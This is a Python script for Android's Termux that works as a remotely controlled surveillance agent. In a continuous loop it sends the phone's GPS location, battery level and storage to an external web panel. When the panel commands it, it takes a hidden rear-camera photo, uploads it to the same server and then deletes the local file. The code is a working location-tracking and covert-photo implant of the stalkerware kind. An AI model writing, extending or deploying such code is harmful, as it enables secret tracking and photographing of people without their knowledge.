import time
import subprocess
import json
import requests
import os
import uuid
import base64

URL_SERVIDOR = "https://nexos-panel.onrender.com/update"
URL_UPLOAD_CAM = "https://nexos-panel.onrender.com/api/upload_camera"
ARQUIVO_ID = os.path.expanduser("~/.nexos_device_id")
ARQUIVO_FOTO = os.path.expanduser("~/nexos_captura.jpg")

def run_command(cmd):
    try: return subprocess.check_output(cmd, shell=True).decode().strip()
    except: return ""

def obter_ou_criar_id_unico():
    if os.path.exists(ARQUIVO_ID):
        with open(ARQUIVO_ID, "r") as f: return f.read().strip()
    novo_id = f"NX-{str(uuid.uuid4())[:6].upper()}"
    with open(ARQUIVO_ID, "w") as f: f.write(novo_id)
    return novo_id

DEVICE_ID = obter_ou_criar_id_unico()

print("\n" + "="*45)
print(f"🛰️  MOTOR NEXOS CAMERA SYSTEM OPERACIONAL")
print(f"🔑  SEU MONITOR ID DE PROD: {DEVICE_ID}")
print("="*45 + "\n")

ultima_lat_valida = -16.6869
ultima_lon_valida = -49.2648
headers_json = {"Content-Type": "application/json"}

while True:
    # 1. Coleta dados de Bateria
    battery = "N/A"
    out_bat = run_command("termux-battery-status")
    if out_bat:
        try: battery = str(json.loads(out_bat).get("percentage", "N/A"))
        except: pass
        
    # 2. Coleta dados de Armazenamento
    storage = "N/A"
    out_df = run_command("df -h /data/data/com.termux/files/home")
    if out_df:
        try:
            lines = out_df.split("\n")
            if len(lines) > 1:
                parts = [p for p in lines[1].split(" ") if p]
                if len(parts) >= 3: storage = f"{parts[3]} livres"
        except: pass

    # 3. Coleta Localização GPS
    lat, lon = ultima_lat_valida, ultima_lon_valida
    out_loc = run_command("termux-location -p gps -r once")
    if out_loc:
        try:
            loc_data = json.loads(out_loc)
            if loc_data.get("latitude") and loc_data.get("longitude"):
                lat = loc_data.get("latitude")
                lon = loc_data.get("longitude")
                ultima_lat_valida = lat
                ultima_lon_valida = lon
        except: pass

    # 4. Envia Sincronismo e Checa se o Botão foi Clicado
    payload = {
        "device_id": DEVICE_ID,
        "battery": battery,
        "storage": storage,
        "uptime": "Ativo",
        "lat": lat,
        "lon": lon
    }

    try:
        response = requests.post(URL_SERVIDOR, data=json.dumps(payload), headers=headers_json, timeout=5)
        if response.status_code == 200:
            res_data = response.json()
            comando_cam = res_data.get("comando_cam", "wait")
            print(f"🛰️ [OK] GPS Ativo. Status Câmera: {comando_cam.upper()}")
            
            # SE O COMPATÍVEL MANDOU "TAKE", BATE A FOTO DE SEGUNDO PLANO
            if comando_cam == "take":
                print("📸 [AÇÃO] Comando recebido! Batendo foto oculta...")
                
                # Deleta resquício antigo
                if os.path.exists(ARQUIVO_FOTO): os.remove(ARQUIVO_FOTO)
                
                # Executa a foto da câmera traseira (ID 0)
                # Nota: Use -c 1 se quiser testar a câmera frontal
                run_command(f"termux-camera-photo -c 0 {ARQUIVO_FOTO}")
                time.sleep(2.0) # Espera a lente abrir e processar
                
                if os.path.exists(ARQUIVO_FOTO) and os.path.getsize(ARQUIVO_FOTO) > 0:
                    with open(ARQUIVO_FOTO, "rb") as img_file:
                        photo_b64 = base64.b64encode(img_file.read()).decode('utf-8')
                    
                    # Faz o upload da imagem para o painel web
                    payload_img = {"device_id": DEVICE_ID, "photo": photo_b64}
                    requests.post(URL_UPLOAD_CAM, data=json.dumps(payload_img), headers=headers_json, timeout=10)
                    print("🚀 [OK] Imagem capturada e enviada com sucesso!")
                    
                    # Apaga do celular para segurança e privacidade
                    os.remove(ARQUIVO_FOTO)
                    
    except Exception as e:
        print(f"⚠️ Alerta de sincronismo: {e}")

    time.sleep(2.0)
